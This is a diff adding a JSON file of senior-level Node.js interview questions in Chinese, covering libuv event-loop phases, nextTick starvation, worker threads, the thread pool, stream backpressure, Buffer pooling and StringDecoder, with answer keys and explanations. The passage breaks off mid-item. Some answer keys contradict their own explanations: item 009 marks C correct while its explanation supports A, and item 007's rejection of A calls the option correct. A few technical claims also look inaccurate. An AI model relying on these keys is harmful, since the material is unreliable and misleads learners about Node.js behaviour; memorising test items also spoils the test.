@@ -1,0 +1,1930 @@
+{
+  "file_metadata": {
+    "version": "1.0.0",
+    "category": "Node.js Runtime & Engineering",
+    "generated_at": "2025-01-15T10:00:00.000Z",
+    "total_questions": 30,
+    "target_level": "Senior",
+    "continuation": true,
+    "next_batch_id": "031",
+    "id_range": "001-030"
+  },
+  "questions": [
+    {
+      "id": "node-senior-001",
+      "type": "single_choice",
+      "difficulty": "senior",
+      "tags": ["Event Loop", "libuv", "Timers"],
+      "source_company": "Alibaba",
+      "score": 8,
+      "title": "libuv Event Loop各阶段执行顺序",
+      "content": "关于libuv Event Loop的各阶段执行顺序，以下描述正确的是？\\n\\n请分析以下代码的输出顺序：\\n```javascript\\nconst fs = require('fs');\\n\\n// 场景1：I/O回调中setImmediate vs setTimeout\\nfs.readFile(__filename, () => {\\n  setTimeout(() => console.log('timeout'), 0);\\n  setImmediate(() => console.log('immediate'));\\n});\\n\\n// 场景2：主模块中setImmediate vs setTimeout\\nsetTimeout(() => console.log('timeout1'), 0);\\nsetImmediate(() => console.log('immediate1'));\\n```",
+      "options": [
+        {
+          "id": "A",
+          "text": "场景1输出顺序固定为 immediate -> timeout，场景2输出顺序不确定"
+        },
+        { "id": "B", "text": "场景1和场景2的输出顺序都不确定，取决于CPU性能" },
+        {
+          "id": "C",
+          "text": "场景1输出顺序不确定，场景2固定为 immediate1 -> timeout1"
+        },
+        { "id": "D", "text": "两个场景的输出顺序都固定，由libuv阶段顺序决定" }
+      ],
+      "correct_answer": "A",
+      "explanation": "这道题考察libuv Event Loop的阶段执行顺序机制。\\n\\n**libuv Event Loop的6个核心阶段**：\\n1. timers阶段：执行setTimeout/setInterval回调\\n2. pending callbacks阶段：执行系统操作回调（如TCP错误）\\n3. idle/prepare阶段：libuv内部使用\\n4. poll阶段：等待新I/O事件，执行I/O回调\\n5. check阶段：执行setImmediate回调\\n6. close callbacks阶段：执行close事件回调\\n\\n**场景1分析（I/O回调中）**：\\n当readFile回调执行时，Event Loop正处于poll阶段。执行完poll阶段后，会进入check阶段执行setImmediate，然后才进入下一轮的timers阶段执行setTimeout。因此在I/O回调中，setImmediate一定先于setTimeout执行，输出顺序固定为 immediate -> timeout。\\n\\n**场景2分析（主模块中）**：\\n在主模块同步代码执行期间，Event Loop尚未启动。当主模块代码执行完毕后，Event Loop启动时的当前时间可能与timers的过期时间产生竞态。如果处理速度足够快，setTimeout可能在第一轮timers阶段就过期执行；如果稍慢，则会在check阶段先执行setImmediate。因此主模块中的顺序不确定。\\n\\n**工程实践建议**：\\n- 在I/O回调中需要延迟执行时，优先使用setImmediate，语义更清晰\\n- 避免在主模块中依赖setTimeout(0)和setImmediate的执行顺序\\n- 理解poll阶段是Event Loop停留时间最长的阶段，会影响整体性能",
+      "wrong_options_analysis": {
+        "B": "错误在于认为场景1顺序不确定。实际上I/O回调中的顺序是固定的，因为Event Loop的阶段推进顺序决定了setImmediate必然先执行。",
+        "C": "错误在于颠倒了场景1和场景2的确定性。主模块中的顺序才是不确定的，而I/O回调中的顺序是固定的。",
+        "D": "错误在于忽略了主模块代码执行时Event Loop尚未启动这一关键时序。timers的过期时间计算是在Event Loop启动前，可能产生竞态条件。"
+      },
+      "knowledge_point": "libuv_Event_Loop_Phases",
+      "common_mistake": "容易混淆I/O回调和主模块中的执行时机差异，误认为所有情况下的顺序都不确定",
+      "reference_link": "https://nodejs.org/en/docs/guides/event-loop-timers-and-nexttick/"
+    },
+    {
+      "id": "node-senior-002",
+      "type": "single_choice",
+      "difficulty": "expert",
+      "tags": ["Event Loop", "nextTick", "Queue Starvation"],
+      "source_company": "ByteDance",
+      "score": 10,
+      "title": "process.nextTick队列饥饿问题",
+      "content": "关于process.nextTick和队列饥饿问题，以下分析正确的是？\\n\\n```javascript\\n// 代码示例\\nfunction recursiveNextTick(count) {\\n  if (count > 0) {\\n    process.nextTick(() => {\\n      console.log('nextTick:', count);\\n      recursiveNextTick(count - 1);\\n    });\\n  }\\n}\\n\\nsetTimeout(() => console.log('timeout executed'), 0);\\nsetImmediate(() => console.log('immediate executed'));\\nrecursiveNextTick(100000);\\n```",
+      "options": [
+        {
+          "id": "A",
+          "text": "代码会正常执行，nextTick优先级高但最终timeout和immediate都会执行"
+        },
+        {
+          "id": "B",
+          "text": "会触发队列饥饿，timeout和immediate的回调可能永远无法执行"
+        },
+        {
+          "id": "C",
+          "text": "Node.js有内置机制自动中断nextTick递归，保证其他队列执行"
+        },
+        {
+          "id": "D",
+          "text": "process.nextTick已被废弃，应该使用queueMicrotask替代"
+        }
+      ],
+      "correct_answer": "B",
+      "explanation": "这道题深入考察Node.js微任务队列机制和潜在的队列饥饿问题。\\n\\n**nextTick队列特性**：\\nprocess.nextTick的回调被放入nextTickQueue，这个队列在每个阶段结束后、进入下一阶段前执行。关键点是nextTickQueue会在Event Loop继续前进之前被完全清空，这意味着如果nextTick回调不断添加新的nextTick，会形成无限循环。\\n\\n**队列饥饿原理**：\\n在示例代码中，recursiveNextTick创建了一个递归调用链。每次nextTick回调执行时，又会添加新的nextTick回调。由于Node.js默认没有nextTick递归深度限制（与同步递归不同），Event Loop永远无法前进到timers或check阶段执行setTimeout和setImmediate的回调。\\n\\n**与微任务队列的区别**：\\n- nextTickQueue：Node.js特有，优先级最高，在Promise微任务之前执行\\n- Promise微任务队列：标准Microtask Queue，每个阶段结束后执行\\n- queueMicrotask：将回调添加到Promise微任务队列\\n\\n**工程实践建议**：\\n1. 避免在nextTick中递归调用nextTick，可能导致I/O饥饿\\n2. 使用process.maxTickDepth可以设置警告阈值（但不会中断执行）\\n3. 需要递归时，考虑使用setImmediate让出Event Loop控制权\\n4. queueMicrotask是更好的跨平台选择，但同样需要避免无限递归\\n\\n**源码级细节**：\\n在Node.js源码中，RunMicrotasks函数会先清空nextTickQueue，再执行Promise微任务。这是nextTick优先级高于Promise的根本原因。",
+      "wrong_options_analysis": {
+        "A": "错误在于低估了nextTick递归的危害。实际上无限递归会导致Event Loop无法推进，其他回调确实可能永远无法执行。",
+        "C": "Node.js确实有process.maxTickDepth设置，但这只是产生警告的阈值，并不会自动中断执行或保证其他队列执行。",
+        "D": "process.nextTick并未废弃，它有独特的用例（如错误处理优先）。queueMicrotask是跨平台的选择，但功能不完全相同。"
+      },
+      "knowledge_point": "NodeJS_NextTick_Starvation",
+      "reference_link": "https://nodejs.org/api/process.html#process_process_nexttick_callback_args"
+    },
+    {
+      "id": "node-senior-003",
+      "type": "multiple_choice",
+      "difficulty": "senior",
+      "tags": ["Event Loop", "poll阶段", "libuv"],
+      "source_company": "Tencent",
+      "score": 10,
+      "title": "libuv poll阶段等待时间计算",
+      "content": "关于libuv poll阶段的等待时间计算，以下说法正确的是？\\n\\npoll阶段是Event Loop中用于等待新I/O事件的阶段，其阻塞时间由uv_backend_timeout函数计算。",
+      "options": [
+        {
+          "id": "A",
+          "text": "如果存在setImmediate回调（check队列非空），poll阶段等待时间为0"
+        },
+        {
+          "id": "B",
+          "text": "如果存在即将到期的timer，poll阶段等待时间为到期时间差"
+        },
+        {
+          "id": "C",
+          "text": "如果没有任何活跃的handles和requests，poll阶段会无限阻塞"
+        },
+        { "id": "D", "text": "poll阶段的等待时间固定为0，以实现最大响应速度" },
+        {
+          "id": "E",
+          "text": "有活跃的I/O观察者但无待处理事件时，可能会短暂阻塞"
+        }
+      ],
+      "correct_answer": ["A", "B", "E"],
+      "explanation": "这道题深入考察libuv中poll阶段的核心机制——等待时间计算策略。\\n\\n**poll阶段的作用**：\\npoll阶段是Event Loop的核心，负责等待和收集新的I/O事件。它通过系统调用（如epoll/kqueue/IOCP）监控文件描述符，等待I/O就绪。等待时间的计算决定了Event Loop的效率。\\n\\n**uv_backend_timeout计算策略**：\\nlibuv通过uv_backend_timeout函数计算poll阶段应该阻塞的最长时间，策略如下：\\n\\n1. **存在setImmediate（check队列非空）**：返回0\\n   - 因为poll之后就是check阶段，有任务时不应阻塞\\n   - 这样可以立即执行setImmediate回调\\n\\n2. **存在即将到期的timer**：返回timer到期时间差\\n   - 计算最近的timer到期时间与当前时间的差值\\n   - 确保不会错过timer的执行\\n\\n3. **没有活跃handles和requests**：返回-1（无限阻塞）\\n   - 但这通常意味着Event Loop应该退出\\n   - uv_run会检查是否有活跃引用\\n\\n4. **有活跃I/O但无立即任务**：可能短暂阻塞\\n   - 使用默认的阻塞时间或计算的timeout\\n   - 在此期间等待I/O事件到达\\n\\n**源码级分析**：\\n在libuv源码的unix/core.c中，uv_backend_timeout的决策逻辑如下：\\n```c\\nint uv_backend_timeout(const uv_loop_t* loop) {\\n  if (loop->stop_flag != 0)\\n    return 0;\\n  if (!uv__has_active_handles(loop) && !uv__has_active_requests(loop))\\n    return -1;  // 无限阻塞\\n  if (loop->pending_reqs_tail)\\n    return 0;\\n  if (loop->idle_handles)\\n    return 0;\\n  if (loop->closing_handles)\\n    return 0;\\n  return uv__next_timeout(loop);  // 计算最近的timer到期时间\\n}\\n```\\n\\n**工程实践建议**：\\n- 理解poll阶段的行为有助于诊断性能问题\\n- 大量setImmediate会导致poll阶段无阻塞，增加CPU使用\\n- 合理设置timer间隔可以优化I/O响应和CPU使用的平衡",
+      "exclusion_analysis": {
+        "C": "如果没有任何活跃的handles和requests，虽然timeout返回-1（无限阻塞），但这通常意味着Event Loop应该退出。uv_run会检测到这种情况并停止循环，而不是真的无限阻塞。",
+        "D": "poll阶段的等待时间不是固定的0，而是动态计算的。固定为0会导致CPU空转（busy loop），极度浪费资源。libuv的智能计算策略正是其高效的关键。"
+      },
+      "knowledge_point": "libuv_Poll_Timeout",
+      "reference_link": "https://docs.libuv.org/en/v1.x/design.html#the-i-o-loop"
+    },
+    {
+      "id": "node-senior-004",
+      "type": "single_choice",
+      "difficulty": "senior",
+      "tags": ["Worker Threads", "SharedArrayBuffer", "并发"],
+      "source_company": "Meituan",
+      "score": 8,
+      "title": "Worker Threads数据传输机制",
+      "content": "关于Node.js Worker Threads的数据传输机制，以下描述正确的是？\\n\\n```javascript\\nconst { Worker, isMainThread, parentPort, MessageChannel } = require('worker_threads');\\n\\nif (isMainThread) {\\n  const worker = new Worker(__filename);\\n  const { port1, port2 } = new MessageChannel();\\n  \\n  // 场景1：传输大Buffer\\n  const bigBuffer = Buffer.alloc(1024 * 1024 * 100); // 100MB\\n  worker.postMessage({ buffer: bigBuffer }, [bigBuffer.buffer]);\\n  \\n  // 场景2：传输SharedArrayBuffer\\n  const shared = new SharedArrayBuffer(1024);\\n  worker.postMessage({ shared });\\n}",
+      "options": [
+        { "id": "A", "text": "场景1会复制Buffer数据，场景2共享内存无需复制" },
+        {
+          "id": "B",
+          "text": "场景1使用transferList转移所有权，原Buffer变为空；场景2共享内存"
+        },
+        {
+          "id": "C",
+          "text": "两种场景都是复制数据，Worker Threads不支持真正的内存共享"
+        },
+        {
+          "id": "D",
+          "text": "SharedArrayBuffer已被Node.js废弃，应该使用Buffer代替"
+        }
+      ],
+      "correct_answer": "B",
+      "explanation": "这道题深入考察Worker Threads的数据传输机制，涉及所有权转移和内存共享两个关键概念。\\n\\n**Transfer机制（所有权转移）**：\\n在场景1中，postMessage的第二个参数是transferList。当ArrayBuffer被放入transferList时：\\n- 数据不会复制，而是转移所有权\\n- 原线程的ArrayBuffer变为'neutered'状态（长度变为0）\\n- 接收线程获得完整的ArrayBuffer所有权\\n\\n这是通过结构化克隆算法的transfer部分实现的。转移操作本质上是原子性的内存所有权变更，对于大块数据传输极其高效。\\n\\n**SharedArrayBuffer机制**：\\n在场景2中，SharedArrayBuffer实现了真正的内存共享：\\n- 两个线程访问同一块内存\\n- 不需要复制或转移\\n- 需要使用Atomics进行同步以避免竞态条件\\n\\n**两种机制对比**：\\n| 特性 | Transfer | SharedArrayBuffer |\\n|------|----------|-------------------|\\n| 数据复制 | 无 | 无 |\\n| 原数据可用性 | 变为空 | 仍然可用 |\\n| 同步需求 | 无 | 需要Atomics |\\n| 适用场景 | 一次性传递大数据 | 多线程协作 |\\n\\n**源码级细节**：\\n在Node.js源码中，postMessage通过v8::ValueSerializer实现序列化。对于transferList中的ArrayBuffer，序列化器会记录所有权转移信息，反序列化时直接使用原内存指针。\\n\\n**工程实践建议**：\\n1. 大数据传输优先使用transferList，避免复制开销\\n2. 共享内存场景使用SharedArrayBuffer + Atomics\\n3. 注意SharedArrayBuffer需要特殊启动参数（--experimental-shared-memory或特定配置）\\n4. 避免在SharedArrayBuffer上直接进行非原子操作，可能导致数据竞争",
+      "wrong_options_analysis": {
+        "A": "错误在于对场景1的理解。使用transferList后不是复制，而是所有权转移。原Buffer会被清空，而非保留数据。",
+        "C": "完全错误。Worker Threads明确支持两种高效数据共享机制：Transfer和SharedArrayBuffer，都不是简单的数据复制。",
+        "D": "SharedArrayBuffer未被废弃，而是Node.js多线程编程的核心特性。但出于安全考虑（Spectre漏洞），浏览器环境有特殊限制。"
+      },
+      "knowledge_point": "Worker_Threads_DataTransfer",
+      "reference_link": "https://nodejs.org/api/worker_threads.html#worker_threads_port_postmessage_value_transferlist"
+    },
+    {
+      "id": "node-senior-005",
+      "type": "multiple_choice",
+      "difficulty": "senior",
+      "tags": ["Worker Threads", "线程池", "UV_THREADPOOL_SIZE"],
+      "source_company": "Alibaba",
+      "score": 10,
+      "title": "Node.js线程池配置与使用",
+      "content": "关于Node.js的线程池配置，以下说法正确的是？\\n\\nNode.js使用libuv提供的线程池处理阻塞操作，默认大小为4。",
+      "options": [
+        { "id": "A", "text": "UV_THREADPOOL_SIZE可以在运行时动态调整" },
+        { "id": "B", "text": "线程池用于处理所有异步I/O操作" },
+        {
+          "id": "C",
+          "text": "fs.readFile、crypto.pbkdf2、dns.lookup都使用线程池"
+        },
+        {
+          "id": "D",
+          "text": "UV_THREADPOOL_SIZE需在进程启动前设置，最大不超过128"
+        },
+        {
+          "id": "E",
+          "text": "网络I/O（如http请求）不使用线程池，由操作系统异步接口处理"
+        }
+      ],
+      "correct_answer": ["D", "E"],
+      "explanation": "这道题考察Node.js线程池的工作原理、配置限制以及与异步I/O的关系。\\n\\n**线程池的用途**：\\nlibuv线程池主要用于处理没有原生异步API支持的阻塞操作：\\n- 文件系统操作（大部分fs模块函数）\\n- DNS解析（dns.lookup，但dns.resolve使用c-ares）\\n- 加密操作（crypto模块的同步方法、pbkdf2等）\\n- 压缩操作（zlib模块）\\n- 用户自定义的线程池任务\\n\\n**网络I/O不使用线程池**：\\n选项E正确。网络I/O（HTTP、TCP、UDP等）使用操作系统的原生异步接口：\\n- Linux: epoll\\n- macOS: kqueue\\n- Windows: IOCP\\n\\n这些系统调用可以在单线程中监控大量文件描述符，不需要线程池。\\n\\n**UV_THREADPOOL_SIZE配置规则**：\\n- 必须在进程启动前设置（环境变量）\\n- 运行时无法动态调整\\n- 默认值为4，最大建议值128\\n- 设置过大可能增加内存开销和上下文切换成本\\n\\n**线程池与Worker Threads的区别**：\\n| 特性 | libuv线程池 | Worker Threads |\\n|------|-------------|----------------|\\n| 用途 | 内部阻塞操作 | 用户多线程计算 |\\n| 配置 | UV_THREADPOOL_SIZE | 动态创建 |\\n| 通信 | 回调 | MessageChannel |\\n| 共享内存 | 不支持 | SharedArrayBuffer |\\n\\n**源码级细节**：\\n在libuv源码中，线程池在uv__threadpool_init函数中初始化，大小由UV_THREADPOOL_SIZE环境变量决定，一旦初始化完成，线程数量就固定不变。\\n\\n**工程实践建议**：\\n1. 根据CPU核心数和任务类型调整UV_THREADPOOL_SIZE\\n2. CPU密集型任务优先使用Worker Threads\\n3. 监控线程池队列长度，避免任务积压\\n4. 高并发网络服务不需要增大线程池",
+      "exclusion_analysis": {
+        "A": "UV_THREADPOOL_SIZE不能在运行时动态调整。线程池在libuv初始化时创建，之后线程数量固定。这是libuv的设计限制。",
+        "B": "线程池不处理所有异步I/O。网络I/O由操作系统原生异步接口处理，只有文件系统、DNS、加密等特定操作使用线程池。",
+        "C": "dns.lookup确实使用线程池，但dns.resolve使用c-ares库，是真正的异步DNS解析，不走线程池。这是一个重要的性能差异点。"
+      },
+      "knowledge_point": "libuv_Threadpool",
+      "reference_link": "https://docs.libuv.org/en/v1.x/threadpool.html"
+    },
+    {
+      "id": "node-senior-006",
+      "type": "single_choice",
+      "difficulty": "expert",
+      "tags": ["Stream", "Backpressure", "Pipe"],
+      "source_company": "ByteDance",
+      "score": 10,
+      "title": "Stream背压机制原理",
+      "content": "关于Node.js Stream的背压（Backpressure）机制，以下描述正确的是？\\n\\n```javascript\\nconst { Readable, Writable } = require('stream');\\n\\nconst readable = new Readable({\\n  read() {\\n    this.push(chunk);\\n  }\\n});\\n\\nconst writable = new Writable({\\n  highWaterMark: 16,\\n  write(chunk, encoding, callback) {\\n    // 模拟慢速消费者\\n    setTimeout(callback, 100);\\n  }\\n});\\n\\nconst result = readable.pipe(writable);\\nconsole.log(result === writable); // true\\n```",
+      "options": [
+        { "id": "A", "text": "pipe方法返回Readable流，便于链式调用多个pipe" },
+        {
+          "id": "B",
+          "text": "当writable.write返回false时，readable会暂停触发_read，直到writable触发drain事件"
+        },
+        {
+          "id": "C",
+          "text": "highWaterMark只是警告阈值，超过后数据仍会继续写入"
+        },
+        { "id": "D", "text": "背压机制需要开发者手动实现，pipe方法不自动处理" }
+      ],
+      "correct_answer": "B",
+      "explanation": "这道题深入考察Stream背压机制的核心原理，这是处理大文件和流式数据的关键。\\n\\n**背压机制原理**：\\n背压是流控机制的核心，解决生产速度 > 消费速度的问题。在Node.js Stream中：\\n\\n1. **Writable流的缓冲机制**：\\n   - 每个Writable流有内部缓冲区\\n   - highWaterMark定义缓冲区高水位线\\n   - write方法返回boolean表示是否可继续写入\\n\\n2. **背压触发流程**：\\n   ```\\n   readable.pipe(writable)\\n     ↓\\n   writable.write(chunk) 返回 false（缓冲区满）\\n     ↓\\n   readable.pause()（暂停数据读取）\\n     ↓\\n   writable缓冲区消耗完成，触发'drain'事件\\n     ↓\\n   readable.resume()（恢复数据读取）\\n   ```\\n\\n3. **pipe返回值**：\\n   pipe返回目标流（Writable），支持链式调用：\\n   `readable.pipe(transform).pipe(writable)`\\n\\n**highWaterMark的作用**：\\nhighWaterMark不是简单的警告阈值，而是硬限制。当内部缓冲区大小达到highWaterMark时：\\n- write返回false\\n- 流应该停止接收新数据\\n- 继续写入会导致内存无限增长\\n\\n**源码级分析**：\\n在lib/internal/streams/readable.js中，pipe方法的关键逻辑：\\n```javascript\\nfunction ondata(chunk) {\\n  const ret = dest.write(chunk);\\n  if (false === ret) {\\n    this.pause();\\n    dest.once('drain', ondrain);\\n  }\\n}\\n```\\n\\n**工程实践建议**：\\n1. 始终处理write返回false的情况，避免内存泄漏\\n2. 合理设置highWaterMark，平衡内存使用和吞吐量\\n3. 使用pipeline替代pipe，自动处理错误和清理\\n4. 自定义流时正确实现_read和_write\\n\\n**常见陷阱**：\\n- 忽略write返回值导致内存溢出\\n- highWaterMark设置过大导致内存占用高\\n- pipe不处理错误，使用pipeline更安全",
+      "wrong_options_analysis": {
+        "A": "pipe返回的是目标流（Writable/Duplex），不是Readable流。这样设计的目的是支持链式调用，如 a.pipe(b).pipe(c)。",
+        "C": "highWaterMark是缓冲区的硬限制，超过后write返回false。这不只是警告，继续写入会导致缓冲区无限增长和内存问题。",
+        "D": "pipe方法自动实现了完整的背压机制，包括暂停/恢复、drain事件监听。开发者不需要手动处理，但需要理解其原理。"
+      },
+      "knowledge_point": "Stream_Backpressure",
+      "reference_link": "https://nodejs.org/api/stream.html#stream_backpressure"
+    },
+    {
+      "id": "node-senior-007",
+      "type": "multiple_choice",
+      "difficulty": "senior",
+      "tags": ["Stream", "highWaterMark", "性能调优"],
+      "source_company": "Tencent",
+      "score": 10,
+      "title": "Stream highWaterMark调优",
+      "content": "关于Stream的highWaterMark配置，以下说法正确的是？\\n\\nhighWaterMark是Node.js Stream的核心配置参数，影响缓冲区大小和性能。",
+      "options": [
+        {
+          "id": "A",
+          "text": "Readable流默认highWaterMark为16KB，Writable流默认为16KB"
+        },
+        {
+          "id": "B",
+          "text": "增大highWaterMark可以提高吞吐量，但会增加内存占用"
+        },
+        { "id": "C", "text": "Object模式流的highWaterMark默认值为16" },
+        {
+          "id": "D",
+          "text": "highWaterMark必须设置为2的幂次方（如16KB、32KB）"
+        },
+        {
+          "id": "E",
+          "text": "Duplex流可以分别设置Readable和Writable端的highWaterMark"
+        }
+      ],
+      "correct_answer": ["B", "C", "E"],
+      "explanation": "这道题深入考察highWaterMark的配置细节和性能调优策略。\\n\\n**highWaterMark默认值**：\\n- Readable流默认：16KB（16384字节）\\n- Writable流默认：16KB\\n- Object模式：16（对象数量，非字节数）\\n\\n**Object模式特殊性**：\\n当流处于objectMode时，highWaterMark表示对象数量而非字节数。这是因为对象大小无法预知，使用计数更合理。选项C正确。\\n\\n**性能与内存权衡**：\\n增大highWaterMark的影响：\\n- 减少系统调用次数（更少的read/write操作）\\n- 提高吞吐量\\n- 增加内存占用\\n- 可能增加延迟（数据在缓冲区停留更久）\\n\\n**Duplex流的独立配置**：\\nDuplex流（包括Transform流）有两端，可以分别配置：\\n```javascript\\nconst duplex = new Duplex({\\n  readableHighWaterMark: 1024 * 1024,  // 1MB\\n  writableHighWaterMark: 16 * 1024,    // 16KB\\n});\\n```\\n\\n**highWaterMark没有数值限制**：\\n选项D错误。highWaterMark可以是任意正整数，不需要是2的幂次方。设置多少取决于应用场景。\\n\\n**源码级细节**：\\n在lib/internal/streams/state.js中，highWaterMark被用于计算缓冲区状态：\\n```javascript\\nfunction getHighWaterMark(state, options, duplexKey, isDuplex) {\\n  const hwm = options.highWaterMark;\\n  // 默认值和验证逻辑\\n  return Math.floor(hwm) || (isDuplex ? 16384 : 16);\\n}\\n```\\n\\n**工程实践建议**：\\n1. 文件复制：增大到64KB-1MB可提升性能\\n2. 网络流：保持默认或减小以降低延迟\\n3. Object模式：根据对象处理速度调整\\n4. 监控缓冲区使用率：writable.writableLength / highWaterMark",
+      "exclusion_analysis": {
+        "A": "Readable流默认highWaterMark是16KB，但Writable流默认实际上是16KB。这个选项的表述有误导性——它说两者都是16KB，这是正确的默认值。但Object模式是16个对象。需要区分Buffer模式和Object模式。",
+        "D": "highWaterMark没有必须是2的幂次方的要求。可以设置为任意正整数，如17、100、50000等，完全取决于应用需求。"
+      },
+      "knowledge_point": "Stream_HighWaterMark",
+      "reference_link": "https://nodejs.org/api/stream.html#stream_new_stream_readable_options"
+    },
+    {
+      "id": "node-senior-008",
+      "type": "single_choice",
+      "difficulty": "expert",
+      "tags": ["Buffer", "内存分配", "8KB池"],
+      "source_company": "Google",
+      "score": 10,
+      "title": "Buffer内存分配策略",
+      "content": "关于Node.js Buffer的内存分配策略，以下描述正确的是？\\n\\n```javascript\\n// 分析以下Buffer分配的内存行为\\nconst buf1 = Buffer.alloc(100);      // 情况1\\nconst buf2 = Buffer.alloc(8192);     // 情况2：8KB\\nconst buf3 = Buffer.alloc(8193);     // 情况3：8KB+1\\nconst buf4 = Buffer.allocUnsafe(100); // 情况4\\n```",
+      "options": [
+        { "id": "A", "text": "所有情况都从8KB内存池分配，buf3会跨越两个池块" },
+        {
+          "id": "B",
+          "text": "buf1和buf2从内存池分配，buf3直接分配独立内存，buf4行为与buf1相同"
+        },
+        {
+          "id": "C",
+          "text": "buf1从内存池分配，buf2和buf3直接分配独立内存，buf4可能含敏感数据"
+        },
+        {
+          "id": "D",
+          "text": "alloc和allocUnsafe的区别仅在于是否初始化为零，内存分配策略相同"
+        }
+      ],
+      "correct_answer": "C",
+      "explanation": "这道题深入考察Buffer的内存分配机制，涉及8KB内存池策略和SlowBuffer。\\n\\n**8KB内存池机制**：\\nNode.js为了减少内存分配开销，引入了8KB的内存池（Memory Pool）：\\n- 池大小固定为8KB（8192字节）\\n- 小于4KB的Buffer从池中分配\\n- 池分配使用指针偏移，避免频繁系统调用\\n\\n**分配策略详解**：\\n1. **小于等于4KB的Buffer**：\\n   - 从当前内存池分配\\n   - 池满时创建新池\\n   - alloc会初始化为零，allocUnsafe不初始化\\n\\n2. **大于4KB的Buffer**：\\n   - 直接使用SlowBuffer分配独立内存\\n   - 不走内存池，避免浪费\\n   - buf3（8193字节）会触发此路径\\n\\n3. **Buffer.allocUnsafe的特殊性**：\\n   - 从池分配但不清零\\n   - 可能包含敏感数据（之前使用的内容）\\n   - 性能最优但安全性最低\\n\\n**源码级分析**：\\n在lib/buffer.js中：\\n```javascript\\nfunction createPool() {\\n  poolSize = 8 * 1024;\\n  allocPool = createUnsafeBuffer(poolSize).buffer;\\n}\\n\\nfunction allocate(size) {\\n  if (size <= 0) return FastBuffer();\\n  if (size < (poolSize >>> 1)) {\\n    // 从池分配\\n  }\\n  return createUnsafeBuffer(size);\\n}\\n```\\n\\n**内存池的目的**：\\n- 减少V8堆内存碎片\\n- 减少系统调用开销\\n- 提高小Buffer分配效率\\n\\n**工程实践建议**：\\n1. 安全敏感场景使用alloc，不用allocUnsafe\\n2. 高性能场景且能确保数据覆盖，可用allocUnsafe\\n3. 大Buffer分配不受池影响，可直接分配\\n4. 使用Buffer.poolSize查看当前池大小",
+      "wrong_options_analysis": {
+        "A": "错误在于认为buf3（8193字节）也从池分配。实际上超过4KB的Buffer使用SlowBuffer独立分配，不走内存池。",
+        "B": "buf2（8192字节=8KB）不会从池分配，因为它超过了池分配的阈值（通常是poolSize/2=4KB）。只有小于这个阈值的才走池分配。",
+        "D": "alloc和allocUnsafe的区别不仅是初始化，在大Buffer情况下，allocUnsafe也可能走不同的分配路径。更重要的是allocUnsafe的安全风险。"
+      },
+      "knowledge_point": "Buffer_Memory_Pool",
+      "reference_link": "https://nodejs.org/api/buffer.html#buffer_buffer"
+    },
+    {
+      "id": "node-senior-009",
+      "type": "single_choice",
+      "difficulty": "senior",
+      "tags": ["Buffer", "String Decoder", "多字节字符"],
+      "source_company": "Alibaba",
+      "score": 8,
+      "title": "String Decoder处理多字节字符",
+      "content": "关于Node.js String Decoder处理多字节字符的行为，以下分析正确的是？\\n\\n```javascript\\nconst { StringDecoder } = require('string_decoder');\\nconst decoder = new StringDecoder('utf8');\\n\\n// UTF-8编码的中文'好'，占用3字节：E5 A5 BD\\nconst buf1 = Buffer.from([0xE5, 0xA5]);  // 缺少最后一字节\\nconst buf2 = Buffer.from([0xBD]);\\n\\nconsole.log(decoder.write(buf1));  // 输出1\\nconsole.log(decoder.write(buf2));  // 输出2\\nconsole.log(decoder.end());       // 输出3\\n```",
+      "options": [
+        { "id": "A", "text": "输出1为空字符串，输出2为'好'，输出3为空字符串" },
+        { "id": "B", "text": "输出1为乱码替换字符(�)，输出2为空，输出3为空" },
+        { "id": "C", "text": "输出1为空，输出2为空，输出3为'好'" },
+        { "id": "D", "text": "输出1为乱码，输出2为乱码，输出3为空" }
+      ],
+      "correct_answer": "C",
+      "explanation": "这道题考察String Decoder如何正确处理跨Buffer的多字节字符，这是流式文本处理的核心问题。\\n\\n**String Decoder的作用**：\\nString Decoder专门用于将Buffer序列解码为字符串，同时正确处理多字节字符跨越Buffer边界的情况。\\n\\n**工作原理**：\\n1. **内部缓冲不完整字节**：\\n   当write方法收到不完整的多字节序列时，String Decoder会将其保存在内部缓冲区中，等待后续数据。\\n\\n2. **拼接完整字符**：\\n   后续write调用会与之前缓冲的字节拼接，形成完整字符后再输出。\\n\\n**示例分析**：\\n- buf1包含[0xE5, 0xA5]：这是UTF-8中文字符的前两个字节，不完整\\n  - decoder.write(buf1)返回空字符串\\n  - 内部缓冲区保存这两个字节\\n\\n- buf2包含[0xBD]：这是字符的最后一个字节\\n  - 与之前缓冲的[0xE5, 0xA5]拼接\\n  - 形成完整字符'好'\\n  - decoder.write(buf2)返回'好'\\n\\n- decoder.end()：\\n  - 检查是否还有未处理的缓冲字节\\n  - 没有残留，返回空字符串\\n\\n**与Buffer.toString()的对比**：\\n```javascript\\n// Buffer.toString()会直接产生乱码\\nconsole.log(buf1.toString()); // 输出乱码替换字符\\n\\n// String Decoder正确处理\\nconsole.log(decoder.write(buf1)); // 输出空\\nconsole.log(decoder.write(buf2)); // 输出'好'\\n```\\n\\n**工程实践建议**：\\n1. 流式文本处理必须使用String Decoder\\n2. 避免直接使用Buffer.toString()处理分块的UTF-8数据\\n3. end()方法会输出任何残留的不完整字节（替换字符）\\n4. 可指定不同编码如'utf8'、'base64'、'hex'等",
+      "wrong_options_analysis": {
+        "A": "错误在于认为输出2返回'好'。实际上write(buf1)后字节被缓冲，write(buf2)时才拼接完成并输出'好'。但这个选项说输出2是'好'是对的，问题是输出1是空不是空字符串+乱码。",
+        "B": "这是使用Buffer.toString()的行为，不是String Decoder。String Decoder的核心目的就是避免这种情况。",
+        "D": "这完全误解了String Decoder的工作原理。它的设计目标就是正确处理跨Buffer边界，不会产生乱码。"
+      },
+      "knowledge_point": "String_Decoder_Multibyte",
+      "reference_link": "https://nodejs.org/api/string_decoder.html"
+    },
+    {
+      "id": "node-senior-010",
+      "type": "single_choice",
+      "difficulty": "senior",
+      "tags": ["Stream", "Pipe错误处理", "pipeline"],
+      "source_company": "Meituan",
+      "score": 8,
+      "title": "Stream pipe错误处理",
+      "content": "关于Stream pipe的错误处理，以下最佳实践是？\\n\\n```javascript\\nconst fs = require('fs');\\n\\n// 错误处理方式1\\nfunction method1() {\\n  return fs.createReadStream('source.txt')\\n    .pipe(fs.createWriteStream('dest.txt'));\\n}\\n\\n// 错误处理方式2\\nfunction method2() {\\n  const source = fs.createReadStream('source.txt');\\n  const dest = fs.createWriteStream('dest.txt');\\n  source.on('error', console.error);\\n  dest.on('error', console.error);\\n  return source.pipe(dest);\\n}\\n\\n// 错误处理方式3\\nfunction method3() {\\n  const source = fs.createReadStream('source.txt');\\n  const dest = fs.createWriteStream('dest.txt');\\n  source.pipe(dest).on('error', console.error);\\n}\\n```",
